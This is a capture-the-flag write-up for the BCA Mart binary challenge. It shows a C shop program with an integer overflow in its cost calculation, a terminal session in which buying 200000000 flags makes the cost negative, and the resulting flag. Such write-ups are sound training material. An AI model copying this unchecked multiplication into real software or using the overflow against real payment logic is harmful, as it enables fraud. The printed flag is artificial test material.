# BCA Mart

#### Category : binex
#### Points : 75 points (279 solves)
#### Author : Edward Feng

## Challenge
After the pandemic hit, everybody closed up shop and moved online. Not wanting to be left behind, BCA MART is launching its own digital presence. Shop BCA MART from the comfort of your own home today!

-   [bca-mart.c](https://objects.bcactf.com/bcactf2/bca-mart/bca-mart.c)
-   [bca-mart](https://objects.bcactf.com/bcactf2/bca-mart/bca-mart)
-   `nc bin.bcactf.com 49153`

## Solution
This was a simple integer overflow problem

Looking at the source code `bca-mart.c`, we see 
The initial money (15)
```cpp
int money = 15;
```

The price of the flag (100)
```cpp
case 6:
                if (purchase("super-cool ctf flags", 100) > 0) {
                    FILE *fp = fopen("flag.txt", "r");
                    char flag[100];

                    if (fp == NULL) {
                        puts("Hmm, I can't open our flag.txt file.");
                        puts("Sorry, but looks like we're all out of flags.");
                        puts("Out of luck, we just sold our last one a couple mintues ago.");
                        puts("[If you are seeing this on the remote server, please contact admin].");
                        exit(1);
                    }

                    fgets(flag, sizeof(flag), fp);
                    puts(flag);
                }
```

The vulnerable code 
```cpp
    scanf("%d", &amount);

    if (amount > 0) {
        cost *= amount;
        printf("That'll cost $%d.\n", cost);
        if (cost <= money) {
            puts("Thanks for your purchse!");
            money -= cost;
```

This code is vulnerable because although it does check if amount is positive or not, it does not check if `cost *= amount` is positive.

We need to provid such an amount so that `cost*amount` goes more than `INT_MAX` after which the cost becomes negative and we are able to buy the flag.

#### Getting Flag
```bash
Welcome to BCA MART!
We have tons of snacks available for purchase.
(Please ignore the fact we charge a markup on everything)

1) Hichew™: $2.00
2) Lays® Potato Chips: $2.00
3) Water in a Bottle: $1.00
4) Not Water© in a Bottle: $2.00
5) BCA© school merch: $20.00
6) Flag: $100.00
0) Leave

You currently have $15.
What would you like to buy?
> 6
How many super-cool ctf flags would you like to buy?
> 200000000
That'll cost $-1474836480.
Thanks for your purchse!
bcactf{bca_store??_wdym_ive_never_heard_of_that_one_before}
```
flag : `bcactf{bca_store??_wdym_ive_never_heard_of_that_one_before}`
